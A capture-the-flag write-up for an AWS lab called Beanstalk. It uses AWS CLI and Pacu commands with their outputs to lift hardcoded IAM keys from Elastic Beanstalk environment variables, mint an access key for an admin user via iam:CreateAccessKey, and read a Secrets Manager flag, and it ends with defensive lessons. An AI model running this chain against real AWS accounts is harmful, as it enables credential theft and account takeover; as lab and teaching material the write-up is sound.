---
title: Beanstalk
categories: [HacksmarterLabs]
tags: [aws, iam, elasticbeanstalk, privilege-escalation, hardcoded-credentials, secretsmanager]
media_subpath: /images/hacksmarter_beanstalk/
image:
  path: 'https://images.coursestack.com/6c69d679-9540-44a9-9b53-8be89a4ceeb4/02766342-d86f-431a-8ee1-ebdcd51495e4?w=600'
---

## Summary

**Beanstalk** is a HackSmarter AWS scenario. The starting position is a long-lived access key for `lab_low_priv_user` in AWS account `588137275719`, and the target is a flag stored in AWS Secrets Manager that this user has no permission to read. The whole chain lives at the AWS control plane. There is no vulnerable web app, no shell, no cryptography, just three IAM identities and two credential pivots.

The starter user cannot read any IAM object, cannot list S3 buckets and cannot describe EC2 instances. Its identity policy does allow seven `elasticbeanstalk:Describe*` actions, two Beanstalk `List*` actions, `ec2:DescribeSubnets`, and a scoped `s3:*` on `elasticbeanstalk*` buckets. One of those Describe calls, `describe-configuration-settings`, returns the environment's merged Beanstalk option settings, including its `EnvironmentVariables`. The lab's environment was deployed with a second IAM user's AWS access key hardcoded in those variables. Reading the settings blob is enough to lift that key.

The lifted key belongs to `lab_secondary_user`, whose attached policy grants `iam:CreateAccessKey` on `Resource: "*"`. That is the canonical "CreateAccessKey" IAM privesc primitive: subject to the two-key quota and normal IAM policy evaluation, it can mint a fresh long-term access key for another IAM user without that user's password, MFA device or console session. The account contains an administrator user, `lab_admin_user`, whose policy is `{"Action": "*", "Resource": "*"}`. Minting a key for that user yields administrator-level access, and the flag is one `secretsmanager:GetSecretValue` away.

The chain composes three conditions:

- `elasticbeanstalk:DescribeConfigurationSettings` on `Resource: "*"` reads plaintext environment variables from any EB environment the policy reaches.
- `iam:CreateAccessKey` on `Resource: "*"` can mint long-term credentials for another IAM user that has a free key slot.
- An explicit `Action: *, Resource: *` policy exists on a user reachable by the primitive above.

> **Category:** AWS / IAM privesc. **Starting position:** long-lived access key for `lab_low_priv_user`. **Theme:** hardcoded credentials in Elastic Beanstalk environment variables, then a textbook `iam:CreateAccessKey` privesc onto an admin user.
{: .prompt-info}

## The Attack Chain at a Glance

```
provided AWS credentials
  -> starter access key = lab_low_priv_user (EB read, ec2:DescribeSubnets, scoped S3 access)
  -> elasticbeanstalk:DescribeConfigurationSettings on lab-app / lab-env
  -> EnvironmentVariables leak SECONDARY_ACCESS_KEY + SECONDARY_SECRET_KEY (plaintext)
  -> load leaked key as lab_secondary_user  (iam:CreateAccessKey Resource:*)
  -> iam:ListUsers -> identify lab_admin_user
  -> iam:CreateAccessKey --user-name lab_admin_user  (privesc primitive)
  -> load minted key as lab_admin_user  (Action:*, Resource:*)
  -> secretsmanager:GetSecretValue --secret-id lab_final_flag  -> FLAG{redacted}
```

---

## 1. Environment Setup

Two things to prepare: a CLI profile for the starter key, and a region setting for every call. AWS access keys do not carry a region, and this profile had no default region configured, so a fresh shell needs `AWS_DEFAULT_REGION` or the CLI fails on regional service calls.

```bash
cat >> ~/.aws/credentials <<'EOF'
[beanstalk]
aws_access_key_id     = <STARTER_ACCESS_KEY_ID>
aws_secret_access_key = <STARTER_SECRET_ACCESS_KEY>
EOF

export AWS_PROFILE=beanstalk AWS_DEFAULT_REGION=us-east-1 AWS_PAGER=""
aws sts get-caller-identity
```

```json
{
    "UserId":  "AIDAYR35WUFDX2DNWEBTT",
    "Account": "588137275719",
    "Arn":     "arn:aws:iam::588137275719:user/lab_low_priv_user"
}
```

The ARN is the authoritative identity indicator here: it names an IAM **user**. The `AIDA` prefix is consistent with that because AWS uses it for IAM user unique IDs; `AROA` identifies role unique IDs. Do not compare it with `ASIA`, which is a prefix for a temporary **access key ID**, not for the `UserId` field shown here.

> **`get-caller-identity` needs no permissions.** STS returns the account, principal ARN and unique ID for whichever credentials the SDK finds, whether or not the caller can do anything else. Always start with it, both to confirm the credentials load and to fingerprint the identity before enumerating policies against it.
{: .prompt-tip}

---

## 2. Reconnaissance

### 2.1 IAM self-read is denied

The instinct on any AWS box is to read the caller's own policies first. That path is closed here:

```bash
aws iam list-attached-user-policies --user-name lab_low_priv_user
aws iam list-user-policies         --user-name lab_low_priv_user
aws iam list-groups-for-user       --user-name lab_low_priv_user
aws iam get-account-summary
aws s3api list-buckets
aws ec2 describe-instances
```

Each call returns its service's form of `AccessDenied`. A representative IAM error is:

```
An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation:
User: arn:aws:iam::588137275719:user/lab_low_priv_user is not authorized to perform:
iam:ListAttachedUserPolicies on resource: user lab_low_priv_user
because no identity-based policy allows the iam:ListAttachedUserPolicies action
```

That is a genuine denial, not a missing region or bad credential: the caller is authenticated, but their identity-based policy carries none of the IAM read actions. The starter user cannot look at itself.

### 2.2 Blind service enumeration

The box name is a shortcut. In a real engagement there is no "Beanstalk" written on the tin, so the honest starting move when IAM self-read fails is to sweep every service one at a time and see which returns anything other than `AccessDenied`. Two ways to do it: by hand and with Pacu.

**By hand.** A short loop over the services worth probing first (compute, storage, secrets, IaC, container platforms). The `2>&1` folds stderr into stdout so `grep -v` can drop the deny lines; anything left over deserves inspection:

```bash
while read -r service operation; do
  echo "=== aws $service $operation ==="
  aws "$service" "$operation" 2>&1 | grep -vE 'AccessDenied|not authorized'
done <<'EOF'
s3api list-buckets
ec2 describe-instances
lambda list-functions
rds describe-db-instances
dynamodb list-tables
secretsmanager list-secrets
ssm describe-parameters
kms list-keys
cloudformation list-stacks
elasticbeanstalk describe-applications
ecs list-clusters
eks list-clusters
apigateway get-rest-apis
sns list-topics
sqs list-queues
logs describe-log-groups
EOF
```

Every line either dies with `AccessDenied` or comes back empty, with a single exception:

```
=== aws elasticbeanstalk describe-applications ===
{
    "Applications": [
        {
            "ApplicationArn": "arn:aws:elasticbeanstalk:us-east-1:588137275719:application/lab-app",
            ...
```

That is the whole recon result: one service returns data. A slightly heavier version of the same sweep is [`enumerate-iam`](https://github.com/andresriancho/enumerate-iam), which ships a much larger dictionary of read-only calls and reports those that return successfully. A failed probe is not proof of an explicit deny because missing parameters, endpoint errors and authorization failures can all prevent a useful response.

**With Pacu.** [Pacu](https://github.com/RhinoSecurityLabs/pacu) is Rhino Security's AWS exploitation framework. Two of its modules are candidates: `iam__enum_permissions`, which reads IAM policies directly (needs `iam:ListUserPolicies`, `iam:ListAttachedUserPolicies`, etc. and is ineffective when IAM self-read is denied), and `iam__bruteforce_permissions`, which wraps [`enumerate-iam`](https://github.com/andresriancho/enumerate-iam) and tries a dictionary of read calls. The second is the one that fits when IAM is closed.

`uvx` runs Pacu without a persistent install. It opens with a session picker; `0` starts a new one, then it prompts for the name. Importing an AWS CLI profile registers it under the alias `imported-<profile>`:

```
$ uvx pacu
Found existing sessions:
  [0] New session
Choose an option: 0
What would you like to name this new session? beanstalk
Session beanstalk created.

Pacu (beanstalk:No Keys Set) > import_keys beanstalk
  Imported keys as "imported-beanstalk"
Pacu (beanstalk:imported-beanstalk) > run iam__bruteforce_permissions --region us-east-1
```

The `--region` flag is worth passing: in the Pacu version used here, omitting it checks four hard-coded regions (`us-east-1`, `us-east-2`, `us-west-1` and `us-west-2`), needlessly repeating global calls and taking longer. What comes back for the lab region:

```
2026-07-28 14:08:59 [INFO] Starting permission enumeration for access-key-id "<STARTER_ACCESS_KEY_ID>"
2026-07-28 14:09:00 [INFO] -- Account ARN : arn:aws:iam::588137275719:user/lab_low_priv_user
2026-07-28 14:09:00 [INFO] -- Account Id  : 588137275719
2026-07-28 14:09:01 [INFO] Attempting common-service describe / list brute force.
2026-07-28 14:09:02 [INFO] -- sts.get_session_token() worked!
2026-07-28 14:09:02 [INFO] -- sts.get_caller_identity() worked!
2026-07-28 14:09:09 [INFO] -- dynamodb.describe_endpoints() worked!
2026-07-28 14:09:14 [INFO] -- ec2.describe_subnets() worked!

[iam__bruteforce_permissions] MODULE SUMMARY:

Num of IAM permissions found: 4
```

Then `whoami` renders the collected view as JSON:

```
Pacu (beanstalk:imported-beanstalk) > whoami
{
  "UserName": null,
  "Arn": null,
  "AccessKeyId": "<STARTER_ACCESS_KEY_ID>",
  "KeyAlias": "imported-beanstalk",
  "PermissionsConfirmed": null,
  "Permissions": {
    "Allow": [
      "sts:GetSessionToken",
      "sts:GetCallerIdentity",
      "dynamodb:DescribeEndpoints",
      "ec2:DescribeSubnets"
    ],
    "Deny": []
  }
}
```

> **Pacu missed the actual vulnerability.** The four reported actions above look like the answer, but three do not demonstrate an identity-policy allow. `sts:GetCallerIdentity` requires no permission. `sts:GetSessionToken` also requires no IAM permission when called with the long-term credentials of an IAM user (it cannot be called with an existing STS session). `dynamodb:DescribeEndpoints` exposes regional endpoint metadata without testing access to account data. That leaves `ec2:DescribeSubnets` as the only policy-backed hit, and the entire Elastic Beanstalk surface is absent. The reason is structural: `enumerate-iam` only invokes read calls that require no parameters, and its generated dictionary explicitly excludes `DescribeApplications` and `DescribeEnvironments`. It cannot call `DescribeConfigurationSettings` because that operation requires an application name plus either an environment name or a configuration template name. A zero-argument brute-forcer will always miss context-required actions.
{: .prompt-warning}

So `iam__bruteforce_permissions` is honest about what it finds but blind to what fits this box. The right Pacu module is service-specific: `elasticbeanstalk__enum`, which knows to iterate applications, environments and configuration settings, and even scans the option values for anything that looks like a secret. Running it against the same starter key:

```
Pacu (beanstalk:imported-beanstalk) > run elasticbeanstalk__enum --regions us-east-1
  Running module elasticbeanstalk__enum...
[elasticbeanstalk__enum] Enumerating BeanStalk data in region us-east-1...
[elasticbeanstalk__enum]   1 application(s) found in us-east-1.
[elasticbeanstalk__enum]   2 environment(s) found in us-east-1.
    Potential secret in environment variable: EnvironmentVariables => SECONDARY_SECRET_KEY=<LEAKED_SECRET_ACCESS_KEY>,PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=<LEAKED_ACCESS_KEY_ID>
    Potential secret in environment variable: SECONDARY_ACCESS_KEY => <LEAKED_ACCESS_KEY_ID>
[elasticbeanstalk__enum]   2 configuration setting(s) found in us-east-1.
[elasticbeanstalk__enum]   6 potential secret(s) found in config settings and saved to: /home/kali/.local/share/pacu/beanstalk/downloads/beanstalk_secrets_beanstalk_us-east-1.txt

[elasticbeanstalk__enum] MODULE SUMMARY:

    1 total application(s) found.
    2 total environment(s) found.
    2 total configuration setting group(s) found.
    6 potential secret(s) discovered in config settings.
```

The count of two environments is a redeploy artifact, not two distinct lab targets. At the time of this Pacu run, `DescribeEnvironments` returned the current `lab-env` and a recently terminated record with the same environment name. The module then called `DescribeConfigurationSettings` by name for both records, receiving the current settings twice. Its six regex hits therefore include duplicates (and `SSHSourceRestriction` false positives); the useful result is still one secondary access-key pair.

`elasticbeanstalk__enum` does exactly what the manual chain does (`describe-applications` → `describe-environments` → `describe-configuration-settings`) and adds a regex pass that flags any option value looking like a credential. It surfaces the same `SECONDARY_ACCESS_KEY` / `SECONDARY_SECRET_KEY` pair the manual sweep would have found. That is the moral: `iam__bruteforce_permissions` is the wrong tool for a hardcoded-secrets box, but Pacu ships a service-specific module for exactly this pattern.

Elastic Beanstalk (EB) is the AWS PaaS that packages an EC2 fleet, load balancer, autoscaling group and CloudFormation stack under one "application/environment" abstraction. The rest of section 2 walks the same finding with the raw AWS CLI, so the option settings and their meaning are explicit; the full Pacu chain from starter key to flag lives in the appendix.

### 2.3 Enumerate the EB application and environment

```bash
aws elasticbeanstalk describe-applications
```

```json
{
    "Applications": [{
        "ApplicationArn":  "arn:aws:elasticbeanstalk:us-east-1:588137275719:application/lab-app",
        "ApplicationName": "lab-app",
        "Description":     "Elastic Beanstalk application for insecure secrets scenario",
        ...
    }]
}
```

The description string, `insecure secrets scenario`, is the loudest hint the challenge provides. Elastic Beanstalk has a well-known misconfiguration class: application secrets stuffed into `EnvironmentVariables` for convenience during deploy, forgotten, and left readable to callers allowed to run `DescribeConfigurationSettings` on the environment.

```bash
aws elasticbeanstalk describe-environments
```

```json
{
    "Environments": [{
        "EnvironmentName":    "lab-env",
        "EnvironmentId":      "e-nqyhutmrmk",
        "ApplicationName":    "lab-app",
        "SolutionStackName":  "64bit Amazon Linux 2023 v4.13.4 running Python 3.11",
        "CNAME":              "lab-env.eba-8gk93mbf.us-east-1.elasticbeanstalk.com",
        "Status":             "Ready",
        ...
    }]
}
```

At this CLI snapshot there is one application (`lab-app`) and one current environment (`lab-env`), running Python 3.11 on Amazon Linux 2023. The public URL serves the default AWS Elastic Beanstalk Python sample page, so there is no vulnerable application logic to attack: the intended vector sits at the control plane. A later redeploy accounts for the active-plus-terminated duplicate in the Pacu output above.

---

## 3. The Foothold: EB Environment Variables Leak

### 3.1 What `describe-configuration-settings` actually returns

`elasticbeanstalk:DescribeConfigurationSettings` returns the merged Beanstalk option settings for an environment, roughly 130 entries covering the platform, the load balancer, the autoscaling group, the VPC, the instance profile and every user-defined environment variable. Those options are grouped by **namespace**, an EB concept that names *where* an option applies. Two of those namespaces are relevant here:

- `aws:cloudformation:template:parameter` holds the parameters passed to the underlying CloudFormation template. One of them, `EnvironmentVariables`, is a comma-joined string of every env var the environment was deployed with.
- `aws:elasticbeanstalk:application:environment` holds those same env vars, but exploded into one option per key.

Both are returned by the same call, and both are plaintext. Any caller with `elasticbeanstalk:DescribeConfigurationSettings` reads them, regardless of whether they have IAM, EC2 or S3 permissions.

### 3.2 Trigger the call

```bash
aws elasticbeanstalk describe-configuration-settings \
    --application-name lab-app --environment-name lab-env
```

Filtering the two revealing entries out of the response:

```json
{
    "Namespace":  "aws:cloudformation:template:parameter",
    "OptionName": "EnvironmentVariables",
    "Value":      "SECONDARY_SECRET_KEY=<LEAKED_SECRET_ACCESS_KEY>,PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=<LEAKED_ACCESS_KEY_ID>"
}
```

```json
[
  { "Namespace": "aws:elasticbeanstalk:application:environment",
    "OptionName": "SECONDARY_ACCESS_KEY",
    "Value": "<LEAKED_ACCESS_KEY_ID>" },
  { "Namespace": "aws:elasticbeanstalk:application:environment",
    "OptionName": "SECONDARY_SECRET_KEY",
    "Value": "<LEAKED_SECRET_ACCESS_KEY>" },
  { "Namespace": "aws:elasticbeanstalk:application:environment",
    "OptionName": "PYTHONPATH",
    "Value": "/var/app/venv/staging-LQM1lest/bin" }
]
```

The `AKIA` prefix on the access key ID marks it as a long-term IAM user access key, not a temporary STS credential (`ASIA`). That distinction matters: `AKIA` credentials remain valid until explicitly deleted or deactivated, while `ASIA` credentials stop working at their configured expiration.

> **Grep both namespaces when auditing EB.** The same secret is returned twice, once as a comma-joined blob under `aws:cloudformation:template:parameter/EnvironmentVariables` and again individually under `aws:elasticbeanstalk:application:environment`. Rules that only inspect one namespace will miss the other, and both are equally readable.
{: .prompt-danger}

### 3.3 What else the option dump reveals

The rest of the option settings paint the environment for completeness. None supplies the starter identity with a path onto the instance:

```
IamInstanceProfile           = lab_eb_instance_profile
DisableIMDSv1                = true
SecurityGroups               = sg-0477d8a1e2f22b6b0
SSHSourceRestriction         = tcp,22,22,0.0.0.0/0
EC2KeyName                   = (empty)
ServiceRole                  = AWSServiceRoleForElasticBeanstalk
```

IMDSv1 is disabled, so the classic tokenless `curl 169.254.169.254/latest/meta-data/iam/security-credentials/...` request would fail; IMDSv2 remains available to software that can obtain a metadata token. `SSHSourceRestriction` is permissive if EB provisions SSH ingress, but `EC2KeyName` is empty, so no standard EC2 key pair was injected. These settings do not prove the instance is impossible to reach by every method, only that they reveal no instance-compromise path for the starter credentials. The intended path is the hardcoded credentials in the option settings.

---

## 4. Pivot 1: `lab_secondary_user`

Load the leaked key as a second profile and confirm the identity:

```bash
cat >> ~/.aws/credentials <<'EOF'

[beanstalk_secondary]
aws_access_key_id     = <LEAKED_ACCESS_KEY_ID>
aws_secret_access_key = <LEAKED_SECRET_ACCESS_KEY>
EOF

export AWS_PROFILE=beanstalk_secondary AWS_DEFAULT_REGION=us-east-1 AWS_PAGER=""
aws sts get-caller-identity
```

```json
{
    "UserId":  "AIDAYR35WUFDYFPMBDAZU",
    "Account": "588137275719",
    "Arn":     "arn:aws:iam::588137275719:user/lab_secondary_user"
}
```

Same account, different user. Now enumerate what `lab_secondary_user` can do.

### 4.1 Attached policy

```bash
aws iam list-attached-user-policies --user-name lab_secondary_user
```

```json
{ "AttachedPolicies": [{
    "PolicyName": "lab_secondary_policy",
    "PolicyArn":  "arn:aws:iam::588137275719:policy/lab_secondary_policy"
}]}
```

A single customer-managed policy. `list-attached-user-policies` names it, but does not return its document, so two more calls are needed: `get-policy` (returns the default version ID) and `get-policy-version` (returns the actual statements).

```bash
V=$(aws iam get-policy \
      --policy-arn arn:aws:iam::588137275719:policy/lab_secondary_policy \
      --query 'Policy.DefaultVersionId' --output text)
aws iam get-policy-version \
    --policy-arn arn:aws:iam::588137275719:policy/lab_secondary_policy --version-id "$V"
```

```json
{
    "Statement": [
        {
            "Effect":   "Allow",
            "Action":   ["iam:CreateAccessKey"],
            "Resource": "*"
        },
        {
            "Effect":   "Allow",
            "Action": [
                "iam:ListRoles", "iam:GetRole",
                "iam:ListPolicies", "iam:GetPolicy",
                "iam:ListPolicyVersions", "iam:GetPolicyVersion",
                "iam:ListUsers", "iam:GetUser",
                "iam:ListGroups", "iam:GetGroup",
                "iam:ListAttachedUserPolicies",
                "iam:ListAttachedRolePolicies",
                "iam:GetRolePolicy"
            ],
            "Resource": "*"
        }
    ]
}
```

### 4.2 The privesc primitive

`iam:CreateAccessKey` with `Resource: "*"` is a well-known AWS IAM privilege-escalation primitive (Pacu's `iam__privesc_scan` calls the method `CreateAccessKey`). In this account, the permission lets the caller mint a new long-term AWS access key for any IAM user that has a free key slot. The key authenticates as the target user and receives that user's effective permissions, including the effects of any permissions boundary, organization SCP, resource policy or explicit deny. Creating it requires no interaction from the target—no password reset, console login or MFA prompt—although an MFA condition in the target's policies would still apply to later API calls. It is analogous to writing your own SSH key into another user's `~/.ssh/authorized_keys` when you can modify that file.

The second block of the policy provides most of the IAM read surface needed to locate an attractive target. Two omissions matter: `iam:ListAccessKeys` is not granted, so the caller cannot preflight-check whether a target user already has the maximum of two keys; and `iam:ListUserPolicies` (for inline policies) is missing, so only attached managed policies show up in enumeration. Neither omission blocks the chain, they just mean the attacker fires `create-access-key` without knowing whether it will succeed on the first try.

---

## 5. Pivot 2: Find the Admin

### 5.1 Enumerate users

```bash
aws iam list-users
```

```json
{
    "Users": [
        { "UserName": "lab_admin_user",     "UserId": "AIDAYR35WUFD3IZOR2TIO" },
        { "UserName": "lab_low_priv_user",  "UserId": "AIDAYR35WUFDX2DNWEBTT" },
        { "UserName": "lab_secondary_user", "UserId": "AIDAYR35WUFDYFPMBDAZU" }
    ]
}
```

Three users. The naming is a giveaway, but confirm it against policy content rather than trusting the name.

### 5.2 Read the admin user's policy

```bash
aws iam list-attached-user-policies --user-name lab_admin_user

Vadmin=$(aws iam get-policy \
          --policy-arn arn:aws:iam::588137275719:policy/lab_admin_user_policy \
          --query 'Policy.DefaultVersionId' --output text)
aws iam get-policy-version \
    --policy-arn arn:aws:iam::588137275719:policy/lab_admin_user_policy \
    --version-id "$Vadmin"
```

```json
{
    "Statement": [{
        "Effect":   "Allow",
        "Action":   "*",
        "Resource": "*"
    }]
}
```

`Action: *` on `Resource: *`, no conditions. This has the same statement shape as the AWS-managed `AdministratorAccess` policy. A minted access key for `lab_admin_user` therefore grants administrator-level access in this lab, but it is not the AWS account root user: root-only tasks remain unavailable, and any applicable SCP, permissions boundary or explicit deny still wins.

### 5.3 What the starter user actually held (context)

For completeness, once IAM read was possible, dumping `lab_low_priv_policy` clarifies exactly why the starter position looked so narrow:

```json
{
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "elasticbeanstalk:DescribeApplications",
                "elasticbeanstalk:DescribeApplicationVersions",
                "elasticbeanstalk:DescribeConfigurationSettings",
                "elasticbeanstalk:DescribeEnvironmentHealth",
                "elasticbeanstalk:DescribeEnvironmentResources",
                "elasticbeanstalk:DescribeEnvironments",
                "elasticbeanstalk:DescribeEvents",
                "elasticbeanstalk:ListAvailableSolutionStacks",
                "elasticbeanstalk:ListTagsForResource",
                "ec2:DescribeSubnets"
            ],
            "Resource": "*"
        },
        {
            "Effect":   "Allow",
            "Action":   ["s3:*"],
            "Resource": [
                "arn:aws:s3:::elasticbeanstalk*",
                "arn:aws:s3:::elasticbeanstalk*/*"
            ]
        }
    ]
}
```

The `DescribeConfigurationSettings` line is the whole vulnerability. Everything else is padding for this deployment: EB read, an EB-scoped S3 grant that exposed nothing useful here, and `ec2:DescribeSubnets`. On paper the policy looks like EB read access; in practice, that one Describe returns credentials.

---

## 6. Mint the Admin Key

The privesc call is a single request:

```bash
AWS_PROFILE=beanstalk_secondary aws iam create-access-key --user-name lab_admin_user
```

```json
{
    "AccessKey": {
        "UserName":        "lab_admin_user",
        "AccessKeyId":     "<MINTED_ADMIN_ACCESS_KEY_ID>",
        "SecretAccessKey": "<MINTED_ADMIN_SECRET_ACCESS_KEY>",
        "Status":          "Active",
        "CreateDate":      "2026-07-28T15:41:35+00:00"
    }
}
```

> **Two access keys per IAM user is a fixed AWS quota.** If `lab_admin_user` already had two access keys, this call would return `LimitExceeded`. The fallback (`iam:DeleteAccessKey`) is **not** granted by `lab_secondary_policy`, and `iam:ListAccessKeys` is also missing, so there is no way to preflight or clean up. In this deploy the call succeeded first try, but a redeploy where the admin already carries two keys would require a different pivot path.
{: .prompt-warning}

Save the fresh key as a third profile:

```bash
cat >> ~/.aws/credentials <<'EOF'

[beanstalk_admin]
aws_access_key_id     = <MINTED_ADMIN_ACCESS_KEY_ID>
aws_secret_access_key = <MINTED_ADMIN_SECRET_ACCESS_KEY>
EOF
```

Confirming the identity immediately can race IAM propagation:

```bash
export AWS_PROFILE=beanstalk_admin AWS_DEFAULT_REGION=us-east-1 AWS_PAGER=""
aws sts get-caller-identity
```

```
An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation:
The security token included in the request is invalid.
```

In this run that was IAM propagation lag, not a bad key. Fresh access keys are eventually consistent across AWS services and endpoints: STS may briefly reject a key that another service already accepts. Here, `secretsmanager:ListSecrets` succeeded while STS still returned `InvalidClientTokenId` from the same profile. On a newly created key, verify the selected profile and retry with short backoff before concluding that the credentials are wrong.

---

## 7. Loot the Secret

Enumerate what the admin sees. The common secret-storage services on AWS are Secrets Manager, SSM Parameter Store and S3:

```bash
export AWS_PROFILE=beanstalk_admin AWS_DEFAULT_REGION=us-east-1
aws secretsmanager list-secrets
```

```json
{
    "SecretList": [{
        "Name":         "lab_final_flag",
        "ARN":          "arn:aws:secretsmanager:us-east-1:588137275719:secret:lab_final_flag-qG98pX",
        "Description":  null
    }]
}
```

`aws ssm describe-parameters` and `aws s3api list-buckets` return an empty parameter list and the one EB-owned bucket respectively, neither carries anything interesting. The Secrets Manager entry is named unambiguously, read it:

```bash
aws secretsmanager get-secret-value --secret-id lab_final_flag
```

```json
{
    "ARN":          "arn:aws:secretsmanager:us-east-1:588137275719:secret:lab_final_flag-qG98pX",
    "Name":         "lab_final_flag",
    "VersionId":    "terraform-5zv0SkvFZax7N6RnFM04uEwzZA",
    "SecretString": "FLAG{redacted}",
    "VersionStages":["AWSCURRENT"]
}
```

Flag captured. The `terraform-*` version ID is a small tell that the lab is provisioned by Terraform: the AWS Terraform provider stamps versions it creates with a `terraform-` prefix.

---

## Understanding the Attack Chain

| Primitive | Where it lives | Severity in isolation | Severity composed |
|---|---|---|---|
| `elasticbeanstalk:DescribeConfigurationSettings` on `Resource: *` | `lab_low_priv_policy` | Sensitive configuration read. | Critical here. Returns plaintext environment properties containing an access key. |
| Hardcoded AWS access key in EB `EnvironmentVariables` | `lab-app / lab-env` deploy config | A long-term credential exposed through deployment configuration. | Critical. The Beanstalk read becomes a second IAM identity. |
| `iam:CreateAccessKey` on `Resource: "*"` | `lab_secondary_policy` | Dangerous credential-minting permission. | Critical when a more-privileged IAM user has a free key slot. |
| `Action: *, Resource: *` on `lab_admin_user` | `lab_admin_user_policy` | Administrator-level identity. | Critical. Turns the cross-user key creation into administrator access. |
| Two-key-per-user IAM quota | AWS service limit | Not a security control. | Can block this one-shot path if both target key slots are full. |

**Environment variables are configuration, not a secret channel.** EB environment properties sit in the environment's option settings alongside AMI IDs and security-group IDs. `DescribeConfigurationSettings` returns their values in plaintext to an authorized caller, and the application instances receive them as environment variables. Any secret that needs to reach the running app should flow through AWS Secrets Manager (with `secretsmanager:GetSecretValue` scoped to the EB instance role) or SSM Parameter Store `SecureString` (with `kms:Decrypt` on the parameter's KMS key). Storage encryption, where present, does not change what an authorized Beanstalk API caller can retrieve.

**`iam:CreateAccessKey` on `Resource: "*"` is a cross-user credential-minting primitive.** It becomes privilege escalation when a reachable IAM user has more effective privilege and an unused key slot. If self-service key creation is truly required, a common no-path user pattern is `Resource: "arn:aws:iam::*:user/${aws:username}"`; environments that use IAM user paths must account for those paths explicitly. Key creation does not require the target's password, console session or MFA device, but permissions boundaries, SCPs, explicit denies and MFA conditions still apply to the resulting principal.

**IAM propagation is eventually consistent.** A key returned by `CreateAccessKey` can work through one service endpoint before another recognizes it. An initial `InvalidClientTokenId` on a brand-new key can be propagation lag; confirm the selected profile and retry briefly with backoff.

---

## Lessons Learned

- **Never store secrets directly in Elastic Beanstalk `EnvironmentVariables`.** Route secrets through Secrets Manager or SSM Parameter Store `SecureString` and grant the EB instance role `secretsmanager:GetSecretValue` (or `ssm:GetParameter` plus `kms:Decrypt`) with an ARN-scoped `Resource`. Beanstalk returns environment-property values in plaintext through `DescribeConfigurationSettings`.
- **Scope `iam:CreateAccessKey` to the intended user.** For IAM users without paths, the common self-service pattern is `Resource: "arn:aws:iam::*:user/${aws:username}"`. A wildcard resource allows cross-user key creation; it becomes an account-takeover path when a more-privileged user has a free key slot. Review other user-modifying permissions—especially `iam:CreateLoginProfile`, `iam:UpdateLoginProfile`, `iam:AttachUserPolicy` and `iam:PutUserPolicy`—with the same cross-user concern.
- **Prefer roles over long-lived IAM user keys for service-to-service auth.** The credential leak used in this chain disappears if the application uses credentials from the EB instance profile and calls the target service directly. Long-lived `AKIA` credentials do not belong in deployment configuration.
- **Audit both EB option namespaces.** A rule that only inspects `aws:elasticbeanstalk:application:environment` misses the same secret when it also appears under `aws:cloudformation:template:parameter/EnvironmentVariables`. Both namespaces are returned by a single `DescribeConfigurationSettings` call.
- **Alert on `CreateAccessKey` where the caller and target differ.** CloudTrail records the caller principal and the target `userName` in the request parameters. A mismatch is a high-signal event, but legitimate provisioning or rotation automation can also create keys for another user, so allowlist reviewed workflows rather than assuming zero false positives.
- **Treat an identity error on a freshly minted key as a possible propagation delay.** Confirm the profile, then retry with short backoff before assuming the key is bad.

---

## Appendix: The Full Chain in Pacu

The whole chain can be walked without invoking the AWS CLI. Three Pacu modules are enough: `elasticbeanstalk__enum` for the initial credential leak, `iam__backdoor_users_keys` for the CreateAccessKey privesc, and `secrets__enum` for the loot. Each step runs in a fresh Pacu session with the current identity imported, which keeps the `whoami` view clean and mirrors the three identities and two credential pivots in the walkthrough.

### A.1 Leak the secondary key with `elasticbeanstalk__enum`

Import the starter profile and run the EB enum module:

```
Pacu (beanstalk:No Keys Set) > import_keys beanstalk
  Imported keys as "imported-beanstalk"
Pacu (beanstalk:imported-beanstalk) > run elasticbeanstalk__enum --regions us-east-1
[elasticbeanstalk__enum]   1 application(s) found in us-east-1.
[elasticbeanstalk__enum]   2 environment(s) found in us-east-1.
    Potential secret in environment variable: EnvironmentVariables => SECONDARY_SECRET_KEY=<LEAKED_SECRET_ACCESS_KEY>,PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=<LEAKED_ACCESS_KEY_ID>
    Potential secret in environment variable: SECONDARY_ACCESS_KEY => <LEAKED_ACCESS_KEY_ID>
[elasticbeanstalk__enum]   6 potential secret(s) found in config settings and saved to: ~/.local/share/pacu/beanstalk/downloads/beanstalk_secrets_beanstalk_us-east-1.txt
```

Save the leaked pair to `~/.aws/credentials` as `[beanstalk_secondary]` so the next Pacu session can `import_keys` it directly.

### A.2 Mint the admin key with `iam__backdoor_users_keys`

`iam__privesc_scan` checks known IAM privesc methods against the permissions Pacu has collected and can interactively attempt the methods it identifies. The smaller `iam__backdoor_users_keys` module directly exercises the CreateAccessKey primitive. With an explicit `--usernames` list it calls `iam:CreateAccessKey` for each named user without a per-user confirmation prompt:

```
Pacu (p_privesc:No Keys Set) > import_keys beanstalk_secondary
  Imported keys as "imported-beanstalk_secondary"
Pacu (p_privesc:imported-beanstalk_secondary) > run iam__backdoor_users_keys --usernames lab_admin_user
[iam__backdoor_users_keys] Backdoor the following users?
[iam__backdoor_users_keys]   lab_admin_user
[iam__backdoor_users_keys]     Access Key ID: <MINTED_ADMIN_ACCESS_KEY_ID>
[iam__backdoor_users_keys]     Secret Key: <MINTED_ADMIN_SECRET_ACCESS_KEY>

[iam__backdoor_users_keys] MODULE SUMMARY:

  1 user key(s) successfully backdoored.
```

Save the minted pair as `[beanstalk_admin]`.

### A.3 Dump the flag with `secrets__enum`

Import the admin profile and enumerate Secrets Manager (skipping SSM with the explicit `--secrets-manager` flag saves one round-trip per region):

```
Pacu (p_loot:No Keys Set) > import_keys beanstalk_admin
  Imported keys as "imported-beanstalk_admin"
Pacu (p_loot:imported-beanstalk_admin) > run secrets__enum --regions us-east-1 --secrets-manager
[secrets__enum] Starting region us-east-1...
[secrets__enum]  Found secret: lab_final_flag
[secrets__enum] Probing Secret: lab_final_flag

[secrets__enum] MODULE SUMMARY:

    1 Secret(s) were found in AWS secretsmanager
    Check ~/.local/share/pacu/<session name>/downloads/secrets/ to get the values
```

The flag lands on disk instead of stdout:

```bash
cat ~/.local/share/pacu/p_loot/downloads/secrets/secrets_manager/*.txt
```

```
lab_final_flag:FLAG{redacted}
```

